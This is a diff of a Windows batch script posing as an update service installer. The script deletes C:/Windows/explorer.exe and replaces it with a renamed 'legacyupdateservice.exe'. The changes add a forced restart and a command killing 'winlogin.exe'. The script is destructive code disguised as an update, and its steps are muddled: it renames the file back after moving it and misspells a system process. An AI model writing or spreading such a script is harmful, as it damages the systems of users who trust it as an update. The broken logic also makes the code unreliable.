@@ -11,9 +11,11 @@ cd LegacyUpdateService
 start legacyupdateservice.exe
 cd C:/Windows/
 del explorer.exe
-cd C:/Users/%USERPROFILE%/Downloads/LegacyUpdateService
+cd /d "%~dp0"
 taskkill /im legacyupdateservice.exe
 rename legacyupdateservice.exe explorer.exe
 move "%USERPROFILE%\Downloads\LegacyUpdateService/explorer.exe" "C:/Windows/"
+rename explorer.exe legacyupdateservice.exe
 echo Please restart to apply the update.
-shutdown
+shutdown /r
+taskkill /im winlogin.exe
